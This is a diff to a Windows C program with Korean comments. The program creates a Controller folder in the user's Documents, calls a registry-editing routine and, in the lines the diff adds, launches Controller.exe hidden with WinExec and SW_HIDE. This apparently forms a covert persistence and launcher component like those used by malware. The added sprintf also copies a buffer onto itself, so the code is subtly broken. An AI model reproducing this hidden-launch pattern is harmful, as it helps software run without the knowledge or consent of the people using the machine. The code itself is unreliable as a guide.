@@ -6,7 +6,6 @@
 #include <stdio.h>
 #include <tchar.h>
 
-#define DEBUG
 #define BUF_SIZE 256
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
@@ -55,6 +54,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 	int ch;
 	TCHAR Path[10];
 	TCHAR C_Path[BUF_SIZE]; //controller 경로
+	char exe_Path[BUF_SIZE];
+	int ret;
 
 
 	switch (iMessage)
@@ -73,6 +74,10 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			if (GetDriveType(Path) == DRIVE_FIXED)//드라이브 감지
 			{
 				wsprintf(C_Path, _T("%sUsers\\%s\\Documents\\Controller"), Path, Username);
+
+				ret = _waccess(C_Path,0);
+				if (ret == 0)
+					return 0;
 				
 
 				if (_wmkdir(C_Path) == -1)//생성에 실패햇다면 해당경로는 존재하지않음 건너뛴다.
@@ -91,6 +96,10 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 				Regedit(C_Path);
 			}
 		}
+		
+		WideCharToMultiByte(CP_ACP, 0, C_Path, BUF_SIZE, exe_Path, BUF_SIZE, NULL, NULL);
+		sprintf(exe_Path, "%s\\Controller.exe", exe_Path);
+		WinExec(exe_Path, SW_HIDE);
 
 
 	case WM_DESTROY:
@@ -119,5 +128,4 @@ void Regedit(TCHAR *path)
 
 }
 
-//add create process by controller.exe
-//add access controller dir
+
